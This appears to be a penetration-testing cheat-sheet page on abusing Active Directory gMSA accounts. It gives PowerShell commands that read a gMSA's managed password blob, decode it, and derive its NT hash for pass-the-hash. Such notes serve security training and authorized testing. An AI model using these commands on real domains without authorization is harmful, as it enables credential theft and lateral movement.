# gMSA

## Theory

Group Managed Service Account (gMSA) provides automatic password management, SPN management and delegated administration for service account across multiple servers.\
It protects against Kerberoast attack type by generating a random 256 bytes password and rotating it every 30 days.

To read the password you need the <mark style="color:purple;">**msds-ManagedPassword**</mark> permission

## Abuse

### Read current password

{% hint style="info" %}
You need a principal that can read the blob
{% endhint %}

Use [ADmodule ](https://github.com/samratashok/ADModule)and [DSInternal](https://github.com/MichaelGrafnetter/DSInternals)

{% code overflow="wrap" %}
```powershell
$Passwordblob = (Get-ADServiceAccount -Identity <$User> -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
```
{% endcode %}

```powershell
ConvertTo-NTHash -password $decodedpwd.SecureCurrentPassword
```

Now you can [pass the hash](../../lateral-movement/pass-the/pass-the-hash.md)

## References

{% embed url="https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview" %}

